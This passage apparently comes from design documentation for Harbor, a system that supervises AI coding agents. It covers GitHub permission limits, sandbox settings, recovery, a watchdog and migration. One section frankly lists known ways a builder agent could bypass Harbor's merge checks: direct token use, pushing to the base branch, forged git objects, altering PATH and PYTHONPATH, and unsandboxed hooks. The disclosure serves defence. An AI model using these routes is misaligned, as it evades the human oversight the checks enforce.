    configured repository. A PR edit (`PATCH pulls/N`) may set only `title`
    and `body`; `base`, `state` and every other field are refused.
  - GraphQL mutations are allowed only for `addPullRequestReviewThreadReply`,
    `resolveReviewThread`, `unresolveReviewThread` and `addComment`. The query
    is parsed: escapes are decoded, comments stripped and aliases resolved to
    the real field. Fragments inside a mutation, batches and anything Harbor
    cannot parse are refused.
  - A review may only `COMMENT` or `REQUEST_CHANGES`; `APPROVE` is refused.
  - REST writes are limited to the repository Harbor configured
    (`HARBOR_GITHUB_REPOSITORY`). The helper's own commands use that
    repository, a different `--repo` is refused, and with none configured
    the helper refuses to run. GraphQL calls name their target by node ID,
    so this limit does not apply to them; reads go through for any
    repository.
  - Merges, refs, contents and branch protection are refused there.

**Known ways around Harbor's checks.** For a tracked `.harbor/`, branch
protection with Code Owner review stops the first four when the PR touches
`.harbor/` itself (see the rename caveat above). None of them is stopped for an
untracked `.harbor/`:
- the GitHub token used directly, for example `curl` to the REST or GraphQL API;
- the GitHub MCP server's merge tool when `[github] transport = "mcp"`;
- `git push` to the base branch;
- the repository's git directory, which the builder can write. Harbor reads
  its objects but no config, refs or hooks. git does not verify that a loose
  object's content matches its name when it reads it, so the builder could
  write content under an existing commit's or tree's ID that hides a
  `.harbor/` change from the check;
- the builder's own environment: `PATH`, `PYTHONPATH`, `HARBOR_GIT_DIR` and
  `HOME`. Wherever the check runs inside the builder, the builder chooses
  which `git` and which Harbor code run, and which git dir they read;
- anything Harbor runs outside the sandbox that a merged PR controls (the
  `install_command`, git hooks), and the `ios` and `android` escapes. These
  can edit the main checkout directly, so branch protection does not stop
  them either;
- Harbor's own owner-approved-merge instruction
  (`src/harbor/pr_events.py`), which tells the builder to merge with
  `gh pr merge --match-head-commit`. That command does not go through
  `pr-merge` or its `.harbor/` check. This predates device proof and is not
  changed here.

**Fail-closed config.** An unknown platform (`"andriod"`), a repeated
platform, a value that is not a list of strings, or another key in `[builder]`
makes the workflow invalid. `harbor start` refuses the project, and
`harbor doctor` exits 2 with the reason. Absent or empty, the generated
`--settings` are byte-for-byte what they were before this option existed, and
Harbor boots nothing.

**Doctor.** `harbor doctor` uses the same decision as the builder launcher.
It reports the grant whenever any Claude builder of the project could run with
it:
- `builder_provider: claude`;
- either side of a `[quota_fallback]` builder pair;
- a retained Claude builder session in the ledger, which resumes on Claude
  even after the project switches to Codex.

It prints `Device proof: <platforms> · applies to Claude builders (<why>)`
and one `grants ...` line per rule. With Claude possible and nothing
configured, it prints `Device proof: off (...)`. The section is read with the
rest of the workflow on every builder launch, so an edit applies on the next
turn.

**Linux.** Claude Code's settings documentation describes `allowLocalBinding`
and `allowMachLookup` as macOS-only, and there is no iOS Simulator on Linux.
On a non-macOS host, `harbor doctor` adds `not effective on this host: ...`,
and `harbor start` prints the same warning once. Harbor has not been tested
with this option on Linux.

**Codex builders.** `device_proof` does not change a Codex builder. Harbor
already runs Codex with `workspace-write` and network access. Under that
sandbox, `adb start-server`, `adb devices` and a `127.0.0.1` HTTP server plus
`curl` worked without any change. Codex has no setting for Mach services, so
`xcrun simctl` fails there (`CoreSimulatorService connection became invalid`)
and cannot be enabled. When `[builder]` is set and a Codex builder could run,
`harbor doctor` prints `Device proof: not applied to Codex builders (...)`
and `harbor start` warns once.

**Proof scope.** Verified on an Apple silicon Mac with Claude Code 2.1.332 and
Codex CLI 0.170.0. Live haiku builder sessions used Harbor's exact builder
argv. `codex sandbox` used an equivalent permission profile. A sandboxed
builder ran `adb -s emulator-5554 exec-out screencap -p` (a 1080 x 2400 PNG)
and `simctl io booted screenshot` (1206 x 2622). It also ran Playwright
(`playwright-core` 1.58, headless Chromium 145) with `--single-process` against a
page on 127.0.0.1, at 1440 x 900 and 390 x 844. Harbor's device check reused
the running emulator and simulator. Not verified:
- Linux;
- an Intel Mac (the `SimLaunchHost-x86` name);
- Harbor cold-booting an emulator or simulator (both were already running).

### Editing mid-run

Editing `.harbor/workflow/` while a ticket is in flight never blocks it. The
next builder launch reloads the copy and renders its prompt from it, so the new
models and policy (including `merge_mode`) reach the builder, and Harbor records a `policy_change` receipt. There is no
`reconcile` step.

## Hooks and checks

Hooks run at `setup`, `blocker`, `pre_handoff`, `pre_merge` and `pre_cleanup`.
Each hook is `required` (blocks), `advisory` (records failures) or `off`. Script
hooks receive versioned JSON on stdin and return:

```json
{"status":"pass","reason":"requirements satisfied","evidence":["artifact reference"]}
```

Commands are argument arrays, never shell strings. Timeouts terminate the
process group, and JSON output is capped at 64 KiB. Skill hooks use First
Mate's model.

```sh
harbor workflow checks Demo --ticket DEM-1 --parallel
harbor workflow check Demo --ticket DEM-1 --event pre_handoff
harbor workflow check Demo --ticket DEM-1 --event pre_merge
```

## Child agents

The delivery skill spawns planner, implementor and reviewer children with the
builder's own child-agent tools, and the launch prompt gives the rules for
both providers:

- A Codex builder uses the native collaboration tools. Before spawning a role
  it lists the existing agents. It resumes a live one; an interrupted or
  errored one is closed and the role is respawned under a fresh name. A name
  collision is never a blocker.
- A Claude builder uses Claude Code's `Agent` tool and always passes
  `run_in_background: false`. A foreground call waits and returns the child's
  result. Claude Code has no list, resume, message or
  close, so the builder tracks the children it started in the session itself.
  Where Codex would resume or message a child (for example to return review
  fixes to the same implementor), a Claude builder spawns a fresh child for
  that role and hands it the earlier child's report and the current ticket, PR
  and review state. Harbor does not give the Claude builder `SendMessage`, so
  its tool set and its children's stay unchanged. The `false` must be explicit:
  when the parameter is left out, Claude Code starts the child in the
  background, and the builder's turn can end before the child returns. Claude
  Code later runs a follow-up turn with the child's result, but by then the
  builder has already reported its run result without it. The fresh child replaces
  the earlier one, so a ticket keeps one child per role. A new session with no
  earlier child report hands the child the PR and its review comments instead.
- Both providers stop after three failed review rounds. The count is the
  larger of the rounds the builder counted in its session and the rounds on
  the PR, so the limit holds across a fresh session. The review skill posts
  its exact JSON verdict object as a PR comment. Each such comment with
  `"verdict": "reject"` is one failed round, even when it rejects the same
  head again (for example after a fix failed to push). Only comments whose
  `head_sha` is a commit on the PR count. Other comments, such as a human
  "FAIL", do not count.

The launch prompt says that where these rules conflict with the child-agent
steps in the workflow's skills, the launch rules win. A Codex builder still
follows the skills' list, resume and close steps. An existing `.harbor/workflow`
install keeps its own skill copies, which may be older.

Harbor does not register or verify child identities.

## First Mate: monitor and recover

Each poll, First Mate looks at:

- blocked runs older than `recheck_minutes`;
- running builders with no activity for `stall_minutes`;
- failed or orphaned runs whose crash retries are spent;
- `watchdog.flag` events from `harbor watch`.

It returns one action, and Harbor validates and executes it:

| Action | What Harbor does |
| --- | --- |
| `resume` | Resumes the retained session with First Mate's concrete instruction |
| `retry` | Restarts a failed/orphaned builder in its retained session |
| `fresh_session` | Starts a new builder session in the same worktree with a hand-off summary (at most once per run) |
| `wait` | Checks again later |
| `escalate` | Notifies the operator (once) |

Guardrails:

- Product, design, ambiguous-AC and conflicting-instruction blockers, and
  anything touching security, auth, billing, privacy, deletion or migrations,
  always escalate.
- Each run gets `max_recoveries` attempts, re-checked every `recheck_minutes`.
  Only a model usage limit backs off exponentially (30, then 60 minutes).
- A spent budget escalates once and never loops.
- Recovery instructions match the run's builder provider (from
  `runner_identity`). A Codex builder is told to list agents, close stale
  children and respawn them under new names. A Claude builder is told to spawn
  fresh children with `Agent` calls that pass `run_in_background: false`, and
  to give each one the earlier child's report when it has one, plus the ticket,
  the PR and its review comments, because it cannot list or close children.
  When no provider is recorded, or the recorded value is not one Harbor knows,
  the instruction gives both sets of steps, each labelled with its runtime. An
  unrecognised value is passed to First Mate as recorded.

- Watchdog flags get the same eligibility checks: a held or closed ticket is
  never restarted (cleaning up a merged ticket is the one exception).
- A supervisor started with `--ticket` only triages that ticket and leaves other
  tickets' flags for the supervisor that owns them.

Recoveries run as background tasks (`harbor-recovery-<ticket>`), one per
ticket, so polling and other tickets keep moving while a builder recovers. A
stalled live builder is stopped through the normal cancel path (process group
killed, run recorded as terminated) before its replacement starts. A fresh
session receives the full launch prompt (delivery skill, current policy
including merge authority, runtime invocation) followed by First Mate's
hand-off.

Every action posts a `[First Mate recovery]` Linear comment, notifies the
operator and is stored in `first_mate_recoveries`. The cite-or-escalate ladder
for ticket questions is unchanged. A verified merge resolves that run's open
escalations, not those of newer runs on the same ticket.

## Progress watchdog

```sh
harbor watch Demo --minutes 30 --interval 60
```

The watchdog is a separate process. It reads the supervisor heartbeat
(`~/.harbor/heartbeat-<project>.json`) and the ledger, and flags:

- `no_progress`: an active run with no new commit and no new receipt for N minutes;
- `repeated_answer`: the same question answered, or the same comment
  re-delivered, three or more times;
- `cleanup_stuck`: a merged run whose worktree is still present after N minutes;
- `supervisor_stale`: the heartbeat stopped.

Flags are `events` rows with `event_type = 'watchdog.flag'`. First Mate handles
them on the next poll. Stuck cleanups are retried deterministically, with no
model call. The watchdog never touches worktrees, Linear or GitHub.

## Recovery, handoff and cleanup

Console `/answer` persists an answer and schedules same-session work.
Standalone `harbor answer` queues delivery for the project supervisor. Operator
stops are never automatically retried. Holds, inactive states and exhausted
budgets block automatic recovery.

Cleanup requires an independently observed merge, a completed delivery, a
terminal Linear state, the exact local/merged PR head, stopped processes, no
open escalation, no hold and passing `pre_cleanup` hooks. Modified or untracked
files keep the worktree for inspection; git-ignored install and build output
(`node_modules/`, `.next/`, ...) is removed with it. The branch is never deleted.
All ignored files go, including any unique ignored content (local notes,
generated `storage/` data, `.env` copies): keep anything you need outside the
worktree or commit it.

## Migrating

Older setups used `[workflow] package/preset` in `.harbor/workflow.toml`, plus
model and `workflow_path` keys in `pipeline.md`. Harbor now rejects those with a
link to this section.

1. Let in-flight tickets finish, or stop the supervisor.
2. Copy the bundled package: `cp -R <harbor>/workflows/work-pipeline <repo>/.harbor/workflow`.
3. Move each `[roles.<name>]` model and effort from the old `.harbor/workflow.toml`
   into `<repo>/.harbor/workflow/config.toml` as `[<name>]`. Move
   `firstmate_model` from `pipeline.md` into `[first_mate] model`.
4. Move `[checks.*]`, and any policy you had changed (`[delivery]`, `[recovery]`,
   `[decisions]`, `[evidence]`), into the copied `workflow.toml`. `[review]`
   and the evidence `risk`/`proof` keys no longer exist.
5. Delete `<repo>/.harbor/workflow.toml`. Remove `workflow_path`, `skill`,
   `builder_model`, `firstmate_model`, `*_effort`, `*_fallback_models`,
   `recovery_delays` and `firstmate_decisions` from `pipeline.md`.
6. Run `harbor doctor <project>` and `harbor workflow inspect <project>`, then
   commit `.harbor/workflow/`.

Retained runs continue: the first turn after migration records a
`policy_change` receipt instead of blocking.

## Delivery runtime binding

Managed delivery prompts include a shell-quoted invocation that pins the
resolved project registry, the operational ledger, the Python interpreter and
the Harbor import path. Workflow commands and child agents use that invocation
with the supplied project and ticket. The native sandbox includes the ledger
directory for operational receipts; the registry remains read-only.

**Claude builder permissions.** Claude builders run in Claude Code's
`dontAsk` permission mode, which refuses any tool call that is not
pre-approved. Sandboxed Bash is approved automatically, except a command that
sets `PYTHONPATH` or assigns a variable in front of an absolute executable path
(directly or through `/usr/bin/env`), which is exactly what the runtime
invocation does; Read, Glob and Grep only reach the ticket worktree,
and the workflow package lives in your clone outside it; and an edit is refused
everywhere. So Harbor pre-approves three things, and nothing else:

- `Edit` and `Write` in the ticket worktree (`Edit(//<worktree>/**)`); see
  [Claude builder file tools](#claude-builder-file-tools-extra-hosts-and-tmp-builder).

- Bash commands that start with the exact runtime invocation from the prompt
  (`Bash(<invocation>:*)`). They still run inside the OS sandbox, with the same
  writable directories and network allowlist.
- Reading the project's workflow package (`Read(//<repo>/.harbor/workflow/**)`),
  so the builder can open `skills/*/SKILL.md`, `scripts/` and `config.toml`.

No setup is needed. `harbor doctor` prints them as `Builder permissions:` for a
Claude project, and fails if a path contains a wildcard (`*`, `?`, `[`, `]`) or
a line break, which a rule cannot match literally; rename that directory.
Codex builders need neither: their
`workspace-write` sandbox reads anywhere and has no per-command approval.
Verified on macOS with Claude Code 2.1.332 by running the generated command
against a throwaway repository and worktree; not run on Linux.

**Builder access to git metadata.** A ticket worktree's commits are stored in
the project repository's git directory, outside the worktree. Builders of both
providers can write only the parts a commit, fetch and push need: `objects/`,
`refs/`, `logs/`, `packed-refs` (and `shallow`), and the worktree's own
`worktrees/<name>/` directory. The shared `config`, `hooks/`, `info/` and
`modules/` stay read-only, because Harbor and you run git in that repository
outside the sandbox, and a builder that could edit them could make git run its
code there (a hook, `core.fsmonitor`, `core.sshCommand`, a credential helper or
a filter driver). One visible effect: `git push -u` from a builder pushes but
cannot record the upstream in the shared config, and git prints an error for
that part. Harbor's own git commands also run with repository hooks and
`core.fsmonitor` turned off (`-c core.hooksPath=/dev/null -c
core.fsmonitor=false`), so a hook you installed in the project repository does
not run when Harbor creates, checks or removes a ticket worktree. No setup is
needed. Verified on macOS with Codex CLI 0.170.0's seatbelt (`codex sandbox`)
against a throwaway repository; the Claude sandbox and Linux were checked
through the generated settings only.

## Verification map

| Area | Primary files | Scenario tests |
| --- | --- | --- |
| Project workflow and models | config/workflow.py, config/projects.py, onboard.py | test_workflow_config.py, test_onboard.py, test_runtime_resources.py |
| Readiness, hooks, checks | readiness.py, hooks.py, checks.py, workflow_cli.py | test_readiness.py, test_hooks.py, test_parallel_checks.py, test_workflow_fresh_context.py |
| First Mate recovery | first_mate_recovery.py, supervisor.py | test_first_mate_recovery.py |
| Watchdog | watchdog.py, db.py | test_watchdog.py |
| Bounded decisions | unblock.py, decision_policy.py, risk_evidence.py | test_decision_policy.py, test_blocker_recovery.py, test_workflow_evidence.py |
| Cleanup | workflow_lifecycle.py, worktree.py | test_workflow_cleanup_policy.py, test_merge_cleanup.py |
| Device and browser proof | config/workflow.py, runner/claude.py, device_proof.py, device_boot.py, readiness.py, cli.py | test_device_proof.py |
| Claude builder file tools, extra hosts, `/tmp` | config/workflow.py, runner/claude.py, cli.py | test_claude_builder_file_tools.py, test_claude_workflow_permissions.py |

Run `uv run pytest`, `uv run python -m compileall -q src tests` and `uv build`.
The tests use mock external tickets and real local subprocesses and Git
worktrees. They are not evidence of a live Linear-to-merge run.
